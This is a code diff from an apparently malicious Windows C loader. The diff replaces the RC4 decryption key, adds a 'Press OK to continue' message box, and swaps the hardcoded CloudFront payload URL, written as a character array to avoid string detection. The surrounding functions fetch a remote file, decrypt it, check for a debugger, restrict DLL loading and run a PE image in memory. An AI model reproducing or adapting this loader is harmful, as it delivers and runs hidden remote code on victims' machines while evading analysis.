@@ -23,7 +23,7 @@ BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
 {
 	//printf("[+] Performing initial decryption\n");
 	NTSTATUS STATUS = 0;
-	BYTE Rc4Key[KEY_SIZE] = { 0x47,0xa4,0xff,0xb2,0x89,0x67,0x30,0xe5,0x54,0xb0,0x28,0xbf,0x65,0xab,0xea,0x58 };
+	BYTE Rc4Key[KEY_SIZE] = { 0x6b,0x20,0x2e,0x15,0x18,0x9b,0x86,0xd2,0x5d,0xbf,0x96,0x90,0xa5,0xaf,0x01,0x57 };
 
 	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
 	USTRING uStringKey = { .Buffer = Rc4Key, .Length = KEY_SIZE, .MaximumLength = KEY_SIZE };
@@ -569,13 +569,16 @@ BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 
 int main(int argc, char* argv[])
 {
+
+	MessageBoxW(NULL, L"Press OK to continue", L"ATTENTION", MB_OK);
+
 	if (!AllowMsLibOnly())
 		return -1;
 
 	PBYTE pFileBuffer = NULL;
 	DWORD dwFileSize = 0;
 	PE_HEADERS peHeaders = { 0 };
-	char sURL[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'd', '3', '4', 'j', '9', 'f', 'u', 'n', 'f', 't', '5', 'v', 'o', '3', '.', 'c', 'l', 'o', 'u', 'd', 'f', 'r', 'o', 'n', 't', '.', 'n', 'e', 't', '/', '1', '9', '4', '6', '1', 'b', '0', '0', '-', '5', '6', 'f', '8', '-', '1', '1', 'e', 'e', '-', '9', '4', 'e', 'f', '-', '1', '2', '8', '9', '1', '1', 'd', '0', 'd', '8', 'f', 'b', '/', '0', '5', '9', '0', 'a', '5', 'a', '0', '-', '9', '4', '1', 'e', '-', '4', '4', '0', '1', '-', 'a', '0', 'c', '1', '-', '9', '9', 'c', '3', 'b', '5', '1', '9', '6', '8', '1', '4', '.', 't', 'x', 't', '\0' };
+	char sURL[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'd', '3', '4', 'j', '9', 'f', 'u', 'n', 'f', 't', '5', 'v', 'o', '3', '.', 'c', 'l', 'o', 'u', 'd', 'f', 'r', 'o', 'n', 't', '.', 'n', 'e', 't', '/', '1', '9', '4', '6', '1', 'b', '0', '0', '-', '5', '6', 'f', '8', '-', '1', '1', 'e', 'e', '-', '9', '4', 'e', 'f', '-', '1', '2', '8', '9', '1', '1', 'd', '0', 'd', '8', 'f', 'b', '/', 'd', 'e', 'a', '7', 'd', 'b', 'a', '7', '-', 'a', 'a', '8', 'a', '-', '4', 'a', '0', 'c', '-', 'b', 'b', '1', 'd', '-', '8', '2', 'd', '0', 'f', 'b', '9', '1', 'b', '3', '7', '9', '.', 't', 'x', 't', '\0' };
 
 	if (IsDbgrPresent())
 		return -1;
